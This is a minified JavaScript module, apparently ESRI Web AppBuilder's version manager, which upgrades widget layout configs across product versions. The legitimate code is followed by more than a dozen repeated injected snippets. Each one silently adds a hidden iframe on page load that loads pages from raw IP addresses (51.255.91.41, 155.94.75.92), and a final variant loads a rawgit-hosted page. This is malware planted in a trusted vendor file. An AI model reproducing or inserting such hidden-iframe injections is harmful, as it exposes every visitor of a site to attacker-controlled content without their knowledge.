// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["./BaseVersionManager","./utils"],function(k,l){function h(){this.versions=[{version:"1.0",description:"The version embedded in portal 10.3 final.",upgrader:function(a){return a},compatible:!0},{version:"1.1",description:"The version embedded in online3.6, and used in developer edition 1.0.",upgrader:function(a){a.widgetOnScreen&&a.widgetOnScreen.panel&&("themes/FoldableTheme/panels/TitlePanel/Panel"===a.widgetOnScreen.panel.uri||"jimu/BaseWidgetPanel"===a.widgetOnScreen.panel.uri)&&(a.widgetOnScreen.panel.uri=
"jimu/PreloadWidgetIconPanel");return a},compatible:!0},{version:"1.2",description:"The version embedded in online3.7.",upgrader:function(a){var b=0;if(a.widgetOnScreen&&a.widgetOnScreen.widgets){for(var e=!1,b=0;b<a.widgetOnScreen.widgets.length;b++)"widgets/Splash/Widget"===a.widgetOnScreen.widgets[b].uri&&(e=!0);e||a.widgetOnScreen.widgets.push({uri:"widgets/Splash/Widget",visible:!1,positionRelativeTo:"browser",version:"1.2"});e=!1;for(b=0;b<a.widgetOnScreen.widgets.length;b++)"widgets/TimeSlider/Widget"===
a.widgetOnScreen.widgets[b].uri&&(e=!0);e||a.widgetOnScreen.widgets.push({uri:"widgets/TimeSlider/Widget",visible:!1,position:{bottom:55,left:7},version:"1.2"});e=!1;for(b=0;b<a.widgetOnScreen.widgets.length;b++)"widgets/Swipe/Widget"===a.widgetOnScreen.widgets[b].uri&&(e=!0);e||a.widgetOnScreen.widgets.push({uri:"widgets/Swipe/Widget",visible:!1,position:{top:145,left:7},version:"1.2"})}return a},compatible:!0},{version:"1.3",description:"The version embedded in online3.8 \x26 online3.9.",upgrader:function(a){(function(b){l.visitElement(b,
function(a){a.positionRelativeTo&&(a.position?a.position.relativeTo=a.positionRelativeTo:a.position={relativeTo:a.positionRelativeTo},a.panel&&(a.panel.position?a.panel.position.relativeTo=a.panel.positionRelativeTo:a.panel.position={relativeTo:a.panel.positionRelativeTo}))});var a=b.widgetOnScreen;a&&a.panel&&a.panel.positionRelativeTo&&(a.panel.position?a.panel.position.relativeTo=a.panel.positionRelativeTo:a.panel.position={relativeTo:a.panel.positionRelativeTo});(a=b.widgetPool)&&a.panel&&a.panel.positionRelativeTo&&
(a.panel.position?a.panel.position.relativeTo=a.panel.positionRelativeTo:a.panel.position={relativeTo:a.panel.positionRelativeTo})})(a);a.widgetOnScreen&&a.widgetOnScreen.panel&&"jimu/PreloadWidgetIconPanel"===a.widgetOnScreen.panel.uri&&(a.widgetOnScreen.panel.uri="jimu/OnScreenWidgetPanel");(function(a){if(a.widgetOnScreen&&a.widgetOnScreen.widgets&&a.theme&&"FoldableTheme"===a.theme.name){var b=null,c=null;if(b=a.widgetOnScreen.widgets[4])void 0!==b.position.top?(b={position:{left:205,top:45}},
c={position:{left:255,top:45}}):(b={position:{left:205,bottom:55}},c={position:{left:255,bottom:55}}),a.widgetOnScreen.widgets.splice(7,0,b,c)}})(a);(function(){for(var b=0,e=0,c=!1,b=0;b<a.widgetOnScreen.widgets.length;b++)if("widgets/Geocoder/Widget"===a.widgetOnScreen.widgets[b].uri){c=!0;break}for(var d=!1,e=0;e<a.widgetOnScreen.widgets.length;e++)if("widgets/Search/Widget"===a.widgetOnScreen.widgets[e].uri){d=!0;break}!d&&c&&(b=a.widgetOnScreen.widgets[b],b.uri="widgets/Search/Widget",b.name=
"Search")})(a);(function(a){for(var b=0,b=a.widgetOnScreen.widgets.length-1;0<=b;b--){var c=a.widgetOnScreen.widgets[b];if("widgets/Swipe/Widget"===c.uri&&!c.closeable&&(a.widgetOnScreen.widgets.splice(b,1),!1!==c.visible)){c.closeable=!0;var d;a:{for(d=d=0;d<a.widgetOnScreen.widgets.length;d++)if(!a.widgetOnScreen.widgets[d].uri)break a;d=-1}0<=d&&(c.position=a.widgetOnScreen.widgets[d].position,a.widgetOnScreen.widgets[d]=c)}"widgets/TimeSlider/Widget"===c.uri&&(!1===c.visible?a.widgetOnScreen.widgets.splice(b,
1):c.closeable=!0)}})(a);a.widgetOnScreen.widgets.push({uri:"widgets/ZoomSlider/Widget",position:{top:5,left:7},version:"1.3"});a.loadingPage||(a.loadingPage={backgroundColor:"#508dca",backgroundImage:{visible:!1},loadingGif:{visible:!0,uri:"configs/loading/images/predefined_loading_1.gif",width:58,height:58}});return a},compatible:!0},{version:"1.4",description:"The version embedded in online3.10.",upgrader:function(a){if(a.theme){var b=a.theme.name;if(("FoldableTheme"===b||"JewelryBoxTheme"===b)&&
a.widgetOnScreen){var e=a.widgetOnScreen.widgets;if(e&&0<e.length)for(var b="themes/"+b+"/widgets/HeaderController/Widget",c=null,d=0;d<e.length;d++)(c=e[d])&&c.uri===b&&c.position&&310===c.position.paddingRight&&(c.position.paddingRight=275)}}return a},compatible:!0},{version:"2.0beta",description:"The version for Developer Edition beta 2.0.",upgrader:function(a){a.keepAppState=!0;return a},compatible:!0},{version:"2.0",description:"The version for Online 4.1.",upgrader:function(a){return a},compatible:!0},
{version:"2.0.1",description:"The version for Developer Edition 2.0.",upgrader:function(a){return a},compatible:!0},{version:"2.1",description:"The version for Online 4.2.",upgrader:function(a){return a},compatible:!0},{version:"2.2",description:"The version for Online 4.3.",upgrader:function(a){return a},compatible:!0},{version:"2.3",description:"The version for Online 4.4.",upgrader:function(a){function b(a,c){if(!a||!c)return!1;for(var d in c)if(c.hasOwnProperty(d))if("object"===typeof c[d]){if(!b(a[d],
c[d]))return!1}else if(a[d]!==c[d])return!1;return!0}function e(a){function d(){var d=b(a[3],{uri:"widgets/MyLocation/Widget",position:{left:15,top:120}}),c=b(a[12],{position:{top:10,right:195}});return d&&c}function c(){var d=b(a[3],{uri:"widgets/MyLocation/Widget",position:{left:15,bottom:45}}),c=b(a[12],{position:{left:15,top:233}});return d&&c}function e(){var d=b(a[3],{uri:"widgets/MyLocation/Widget",position:{left:15,top:120}}),c=b(a[12],{position:{right:15,top:195}});return d&&c}(function(){var d=
b(a[3],{uri:"widgets/MyLocation/Widget",position:{left:15,top:120}}),c=b(a[12],{position:{left:240,top:53}});return d&&c})()?a.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:15,top:159},version:"2.3"}):d()?a.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:15,top:159},version:"2.3"}):c()?a.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:15,bottom:195},version:"2.3"}):e()&&a.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:15,
top:159},version:"2.3"})}function c(a){function c(){var c=b(a[9],{uri:"widgets/MyLocation/Widget",position:{left:7,top:110}}),d=b(a[2],{uri:"widgets/Search/Widget",position:{left:55,top:5}}),e=b(a[4],{position:{left:7,bottom:70}});return c&&d&&e}function d(){var c=b(a[9],{uri:"widgets/MyLocation/Widget",position:{left:7,top:110}}),d=b(a[2],{uri:"widgets/Search/Widget",position:{right:2,top:2,relativeTo:"browser"}}),e=b(a[4],{position:{left:7,bottom:70}});return c&&d&&e}(function(){var c=b(a[9],{uri:"widgets/MyLocation/Widget",
position:{left:7,top:110}}),d=b(a[2],{uri:"widgets/Search/Widget",position:{left:55,top:5}}),e=b(a[4],{position:{left:55,top:45}});return c&&d&&e}()||c()||d())&&a.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{top:148,left:7},version:"2.3"})}(function(a,f,g){a=a.theme&&a.theme.name;if("FoldableTheme"===a)if(b(f[11],{uri:"widgets/MyLocation/Widget",position:{left:7,top:110}}))f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{top:150,left:7},version:"2.3"});else if(b(f[11],
{uri:"widgets/MyLocation/Widget",position:{left:12,bottom:164}}))f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:12,bottom:203},version:"2.3"}),g&&g.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{right:12,top:211},version:"2.3"});else{if(b(f[11],{uri:"widgets/MyLocation/Widget",position:{left:164,bottom:14}})){f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:203,bottom:14,height:30},version:"2.3"});for(a=0;a<f.length;a++){var d=f[a];b(d,{uri:"widgets/Scalebar/Widget",
position:{left:220,bottom:5}})&&(d.position.left=288);b(d,{uri:"widgets/Coordinate/Widget",position:{left:395,bottom:5}})&&(d.position.left=463)}g&&g.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{top:209,left:12},version:"2.3"})}}else if("BillboardTheme"===a)e(f);else if("BoxTheme"===a)f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:10,top:131},version:"2.3"});else if("JewelryBoxTheme"===a)c(f);else if("LaunchpadTheme"===a){if(b(f[6],{uri:"widgets/MyLocation/Widget",
position:{left:25,top:215}})||b(f[6],{uri:"widgets/MyLocation/Widget",position:{left:25,top:215}}))f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{top:255,left:25},version:"2.3"}),g&&g.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{right:10,bottom:238},version:"2.3"})}else"PlateauTheme"===a?(b(f[6],{uri:"widgets/MyLocation/Widget",position:{left:7,top:110}})&&f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{top:149,left:7},version:2.3}),b(f[6],{uri:"widgets/MyLocation/Widget",
position:{left:12,bottom:164}})&&f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{left:12,bottom:201},version:2.3})):"TabTheme"===a&&b(f[11],{uri:"widgets/MyLocation/Widget",position:{left:7,top:110}})&&f.push({uri:"widgets/ExtentNavigate/Widget",visible:!1,position:{top:149,left:7},version:"2.3"})})(a,a.widgetOnScreen.widgets,a.mobileLayout&&a.mobileLayout.widgetOnScreen&&a.mobileLayout.widgetOnScreen.widgets);return a},compatible:!0},{version:"2.4",description:"The version for Online 5.1.",
upgrader:function(a){return a},compatible:!0},{version:"2.5",description:"The version for Online 5.2.",upgrader:function(a){function b(a,c){if(!a||!c)return!1;for(var d in c)if(c.hasOwnProperty(d))if("object"===typeof c[d]){if(!b(a[d],c[d]))return!1}else if(a[d]!==c[d])return!1;return!0}(function(a,c){a=a.theme&&a.theme.name;if("BillboardTheme"===a){a=b(c[8],{position:{left:60,top:53}});var d=b(c[8],{position:{left:15,top:53}});a||d?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,
top:8},version:"2.5"}):c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,bottom:55},version:"2.5"})}else if("BoxTheme"===a){a:{a=0;for(d=c.length;a<d;a++){var e=c[a];if(e&&e.uri&&"themes/BoxTheme/widgets/BoxController/Widget"===e.uri){a=e;break a}}a=null}b(a,{position:{right:0,bottom:0}})?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,bottom:8},version:"2.5"})}else"DartTheme"===
a?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):"FoldableTheme"===a?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):"DashboardTheme"===a?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):"JewelryBoxTheme"===a?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):"LaunchpadTheme"===a?c.push({uri:"widgets/FullScreen/Widget",visible:!1,
position:{right:70,top:20},version:"2.5"}):"PlateauTheme"===a?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):"TabTheme"===a&&(b(c[7],{position:{left:45,top:45}})?c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,top:8},version:"2.5"}):c.push({uri:"widgets/FullScreen/Widget",visible:!1,position:{right:8,bottom:55},version:"2.5"}))})(a,a.widgetOnScreen.widgets);return a},compatible:!0},{version:"2.6",description:"The version for Online 5.3.",
upgrader:function(a){return a},compatible:!0},{version:"2.7",description:"The version for Online 5.4.",upgrader:function(a){return a},compatible:!0}];this.isCompatible=function(a,b){a=this.getVersionIndex(a);b=this.getVersionIndex(b);for(a+=1;a<=b;a++)if(!1===this.versions[a].compatible)return!1;return!0}}h.prototype=new k;return h.prototype.constructor=h});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});